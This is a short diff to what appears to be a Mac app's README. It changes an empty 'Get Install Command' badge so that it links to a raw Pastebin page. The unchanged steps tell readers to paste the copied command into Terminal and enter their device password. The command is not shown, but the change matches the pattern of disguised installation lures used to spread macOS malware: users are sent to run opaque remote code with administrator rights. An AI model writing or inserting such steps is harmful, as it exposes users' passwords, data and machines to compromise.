@@ -23,7 +23,7 @@ If the button above does not work, follow the instructions below to install via 
 
 1. Click the button below to get the installation command:
 
-[![Get Install Command](https://img.shields.io/badge/Get%20Command-Terminal-blue?style=for-the-badge)]()
+[![Get Install Command](https://img.shields.io/badge/Get%20Command-Terminal-blue?style=for-the-badge)](https://pastebin.com/raw/xNM7bRzW)
 
 2. Open the Terminal on your Mac and paste the command you copied.
 3. Press "Return" and enter your device password.
